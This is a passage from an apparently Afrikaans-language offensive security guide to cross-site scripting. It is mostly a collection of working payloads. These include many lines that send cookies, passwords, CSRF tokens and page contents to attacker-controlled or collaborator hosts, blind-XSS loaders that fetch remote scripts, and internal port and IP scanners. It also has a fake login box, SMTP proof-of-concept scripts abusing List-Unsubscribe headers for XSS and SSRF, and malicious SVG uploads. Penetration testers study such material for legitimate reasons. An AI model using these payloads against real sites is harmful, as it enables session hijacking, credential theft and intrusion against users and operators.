(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS algemene payloads

### Verskeie payloads in 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Laat die gebruiker op die bladsy navigeer sonder om die iframe te verlaat en steel sy aksies (insluitend inligting wat in vorms gestuur word):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Haal Cookies op
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> Jy **sal nie toegang tot die cookies vanaf JavaScript hê nie** as die HTTPOnly flag in die cookie gestel is. Maar hier het jy [some ways to bypass this protection](../hacking-with-cookies/index.html#httponly) as jy gelukkig genoeg is.

### Steel bladsyinhoud
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Vind interne IP-adresse
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Korte tye dui op 'n reagerende poort_ _Langer tye dui op geen reaksie nie._

Kyk na die lys van poorte wat in Chrome geblokkeer is [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) en in Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Boks om credentials te vra
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Auto-fill wagwoorde vasvang
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
When any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

Indien 'n kritieke handler (bv. `function DoLogin(){...}`) later op die bladsy gedeclareer word, en jou payload vroeër loop (bv. via 'n inline JS-in-JS sink), definieer eers 'n `const` met dieselfde naam om die handler te blokkeer en te vergrendel. Latere function declarations kan nie 'n `const`-naam herbinde nie, wat jou hook in beheer laat:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Notes
- Dit berus op uitvoeringsvolgorde: jou injection moet uitgevoer word voordat die regmatige deklarasie.
- As jou payload in `eval(...)` verpak is, sal `const/let` bindings nie globals word nie. Gebruik die dinamiese `<script>` injection technique uit die afdeling “Deliverable payloads with eval(atob()) and scope nuances” om ’n werklike globale, nie-herskryfbare binding te verseker.
- Wanneer sleutelwoordfilters kode blokkeer, kombineer met Unicode-escaped identifiers of `eval(atob('...'))` delivery, soos hierbo getoon.

### Keylogger

Net deur github te soek het ek 'n paar verskillende gevind:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Jy kan ook metasploit `http_javascript_keylogger` gebruik

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Diefstal van PostMessage-boodskappe
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin script loaders (opener-gated)

As 'n bladsy **stoor `event.origin` van `postMessage` en dit later in 'n script-URL inkoppel**, beheer die sender die **origin** van die gelaaide JS:
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Uitbuitingresep (from CAPIG):

- **Gates**: vuur slegs af wanneer `window.opener` bestaan en `pixel_id` is allowlisted; **origin is never checked**.
- **Use CSP-allowed origin**: pivot na 'n domain wat reeds deur die slagoffer se CSP toegelaat word (bv., uitgelogte hulpbladsye wat analytics toelaat soos `*.THIRD-PARTY.com`) en host `/sdk/<pixel_id>/iwl.js` daar via takeover/XSS/upload.
- **Restore `opener`**: in Android WebView, `window.name='x'; window.open(target,'x')` maak die bladsy sy eie opener; stuur die kwaadwillige `postMessage` vanaf 'n gekaperde iframe.
- **Trigger**: die iframe poste `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}`; die ouer laai dan die aanvaller se `iwl.js` vanaf die CSP-toegestane origin en voer dit uit.

Dit verander origin-loos `postMessage`-verifikasie in 'n **remote script loader primitive** wat CSP oorleef as jy op enige origin kan beland wat reeds deur die beleid toegelaat word.

### Supply-chain stored XSS via backend JS concatenation

Wanneer 'n backend **'n gedeelde SDK bou deur JS-stringe te konkateer met gebruiker-gekontroleerde waardes**, kan enige aanhaling-/struktuur-breker script injekteer wat aan elke verbruiker bedien word:

- Voorbeeldpatroon (Meta CAPIG): die bediener heg `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});` direk aan `capig-events.js`.
- Deur `'` of `"]}` in te spuit, sluit jy die literal/object en voeg aanvaller JS by, wat **stored XSS** skep in die verspreide SDK vir elke webwerf wat dit laai (first-party and third-party).

### Stored XSS in gegenereerde verslae wanneer escaping gedeaktiveer is

Indien opgelaaide lêers gepars word en hul metadata in HTML-verslae uitgegee word met escaping gedeaktiveer (`|safe`, custom renderers), is daardie metadata 'n **stored XSS sink**. Voorbeeldvloei:
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
'n Django-template vertoon `{{item|key:"title"|safe}}`, sodat die aanvaller se HTML uitgevoer word.

**Exploit:** plaas **entity-encoded HTML** in enige manifest/config-veld wat die verslag bereik:
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
As dit met `|safe` gerender is, gee die verslag `<img ...>` uit en aktiveer JS wanneer dit besigtig word.

**Hunting:** kyk na report/notification builders wat geparsde velde in `%s`/f-strings hergebruik en auto-escape deaktiveer. Een enkodeerde tag in 'n opgelaaide manifest/log/archive laat XSS vir elke kyker voortbestaan.

### Misbruik van Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Toegang tot Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Jy kan ook gebruik maak van: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Toegang tot Verborge Inhoud

Uit [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) kan 'n mens leer dat, selfs al verdwyn sommige waardes uit JS, dit steeds moontlik is om hulle in JS attributes in verskillende objekte te vind. Byvoorbeeld, 'n input van 'n REGEX kan nog steeds gevind word nadat die waarde van die input van die regex verwyder is:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS misbruik ander kwesbaarhede

### XSS in Markdown

Kan jy Markdown-kode injekteer wat gerender sal word? Miskien kan jy XSS kry! Kyk:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS na SSRF

Het jy XSS op 'n **site wat caching gebruik**? Probeer dit **opgradeer na SSRF** deur Edge Side Include Injection met hierdie payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Gebruik dit om cookie-restriksies, XSS-filters en nog veel meer te omseil!\
Meer inligting oor hierdie tegniek hier: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS in dinamies geskepte PDF

As 'n webblad 'n PDF skep met gebruikersbeheerde insette, kan jy probeer om die bot wat die PDF skep, te **mislei** om **arbitrêre JS-kode uit te voer**.\
As die **PDF-creator bot** sekere **HTML** **tags** vind, sal dit hulle **interpreteer**, en jy kan hierdie gedrag **misbruik** om 'n **Server XSS** te veroorsaak.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

As jy nie HTML-tags kan inject nie, kan dit die moeite werd wees om te probeer om **inject PDF data**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP, bedoel om die prestasie van webblaaie op mobiele toestelle te versnel, inkorporeer HTML-tags aangevul met JavaScript om funksionaliteit te verseker met 'n fokus op spoed en sekuriteit. Dit ondersteun 'n reeks komponente vir verskeie kenmerke, toeganklik via [AMP components](https://amp.dev/documentation/components/?format=websites).

Die [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) formaat brei sekere AMP-komponente uit na e-posse, wat ontvangers in staat stel om direk binne hul e-posse met inhoud te interaksie.

Voorbeeld [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Misbruik (Webmail XSS & SSRF)

Die RFC 2369 `List-Unsubscribe` header embed aanvalleur-beheerde URIs wat baie webmail- en mail-kliënte outomaties omskakel in "Unsubscribe" knoppies. Wanneer daardie URIs sonder validering weergegee of gevra word, word die header 'n injection point vir beide stored XSS (as die unsubscribe link in die DOM geplaas word) en SSRF (as die server die unsubscribe request namens die gebruiker uitvoer).

#### Stored XSS via `javascript:` URIs

1. **Stuur jouself 'n e-pos** waar die header na 'n `javascript:` URI wys, terwyl die res van die boodskap onskadelik bly sodat spamfilters dit nie verwyder nie.
2. **Verseker dat die UI die waarde weergee** (baie kliënte wys dit in 'n "List Info" pane) en kyk of die resulterende `<a>` tag aanvaler-beheerde attributes soos `href` of `target` erf.
3. **Skakel uitvoering aan** (bv. CTRL+click, middle-click, of "open in new tab") wanneer die link `target="_blank"` gebruik; browsers sal die verskafde JavaScript in die oorsprong van die webmail-applikasie evalueer.
4. Waarneem die stored-XSS-primitive: die payload bly by die e-pos en vereis slegs 'n klik om uitgevoer te word.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Die newline-byte (`%0a`) in die URI wys dat selfs ongewone karakters die rendering-pyplyn oorleef in kwesbare kliënte soos Horde IMP H5, wat die string letterlik binne die anchor-tag sal uitvoer.

<details>
<summary>Minimal SMTP PoC wat 'n kwaadwillige List-Unsubscribe header lewer</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Bedienerkant afmeld-proxies -> SSRF

Sommige kliënte, soos die Nextcloud Mail app, proxy die afmeld-aksie bedienerkant: deur op die knoppie te klik gee dit die bediener opdrag om self die verskafde URL te haal. Dit verander die header in 'n SSRF-primitive, veral wanneer administrateurs 'allow_local_remote_servers' => true stel (gedokumenteer in [HackerOne report 2902856](https://hackerone.com/reports/2902856)), wat versoeke na loopback en RFC1918-reekse toelaat.

1. **Stel 'n e-pos op** waarin `List-Unsubscribe` na 'n deur die aanvaller beheerde endpunt wys (vir blind SSRF gebruik Burp Collaborator / OAST).
2. **Hou `List-Unsubscribe-Post: List-Unsubscribe=One-Click`** sodat die UI 'n een-klik afmeld-knoppie wys.
3. **Voldoe aan vertrouensvereistes**: Nextcloud, byvoorbeeld, voer slegs HTTPS-afmeldversoeke uit wanneer die boodskap DKIM slaag, dus moet die aanvaller die e-pos teken met 'n domein wat hulle beheer.
4. **Lewer die boodskap aan 'n posbus wat deur die teiken-bediener verwerk word** en wag totdat 'n gebruiker op die afmeld-knoppie klik.
5. **Waarnem die bedienerkant-terugroep** by die collaborator endpunt, en skuif dan na interne adresse sodra die primitive bevestig is.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>DKIM-ondertekende List-Unsubscribe boodskap vir SSRF-toetsing</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Toetsnotas**

- Gebruik 'n OAST endpoint om blind SSRF hits te versamel, en pas dan die `List-Unsubscribe` URL aan om te mik na `http://127.0.0.1:PORT`, metadata services, of ander interne hosts sodra die primitive bevestig is.
- Omdat die unsubscribe helper dikwels dieselfde HTTP stack as die toepassing hergebruik, erf jy sy proxy settings, HTTP verbs, en header rewrites, wat verdere traversal tricks moontlik maak soos beskryf in die [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS oplaai van lêers (svg)

Laai as 'n beeld 'n lêer op soos die volgende een (van [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Vind **meer SVG payloads in** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Gemengde JS-truuks & Relevante Inligting


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS hulpbronne

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
